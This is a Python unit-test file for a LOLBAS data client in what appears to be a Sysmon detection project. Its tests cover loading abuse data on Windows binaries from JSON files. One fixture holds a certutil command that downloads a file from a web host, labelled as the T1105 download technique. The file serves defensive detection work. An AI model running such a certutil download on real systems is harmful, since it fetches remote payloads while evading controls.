"""Unit tests for LOLBAS client."""

import json
import tempfile
from pathlib import Path

import pytest

from lolbas_sysmon.services import LOLBASClient


class TestLOLBASClient:
    """Tests for LOLBASClient class."""

    @pytest.fixture
    def client(self):
        """Create LOLBAS client instance."""
        return LOLBASClient(url="https://example.com/lolbas.json", default_json="test_lolbas.json")

    @pytest.fixture
    def sample_data(self):
        """Sample LOLBAS data."""
        return [
            {
                "Name": "Certutil.exe",
                "OriginalFileName": "CertUtil.exe",
                "Description": "Certificate utility",
                "Commands": [
                    {
                        "Command": "certutil.exe -urlcache -f http://example.com/file.exe",
                        "Description": "Download file",
                        "MitreID": "T1105",
                        "Category": "Download",
                    }
                ],
                "ATT&CK": [{"ID": "T1105"}],
            }
        ]

    def test_load_from_file(self, client, sample_data):
        """Test loading LOLBAS data from local file."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
            json.dump(sample_data, f)
            json_path = f.name

        try:
            data = client.load_from_file(json_path)
            assert len(data) == 1
            assert data[0]["Name"] == "Certutil.exe"
        finally:
            Path(json_path).unlink(missing_ok=True)

    def test_load_from_file_not_found(self, client):
        """Test loading from non-existent file raises FileNotFoundError."""
        with pytest.raises(FileNotFoundError):
            client.load_from_file("nonexistent_file.json")

    def test_load_from_file_invalid_json(self, client):
        """Test loading invalid JSON raises JSONDecodeError."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
            f.write("invalid json content")
            json_path = f.name

        try:
            with pytest.raises(json.JSONDecodeError):
                client.load_from_file(json_path)
        finally:
            Path(json_path).unlink(missing_ok=True)

    def test_get_lolbas_data_with_local_path(self, client, sample_data):
        """Test getting LOLBAS data with explicit local path."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
            json.dump(sample_data, f)
            json_path = f.name

        try:
            data = client.get_lolbas_data(local_path=json_path)
            assert len(data) == 1
            assert data[0]["Name"] == "Certutil.exe"
        finally:
            Path(json_path).unlink(missing_ok=True)

    def test_get_lolbas_data_fallback_to_default(self, client, sample_data):
        """Test fallback to default JSON when no local path provided."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
            json.dump(sample_data, f)
            default_path = f.name

        try:
            client.default_json = default_path
            data = client.get_lolbas_data()
            assert len(data) == 1
            assert data[0]["Name"] == "Certutil.exe"
        finally:
            Path(default_path).unlink(missing_ok=True)
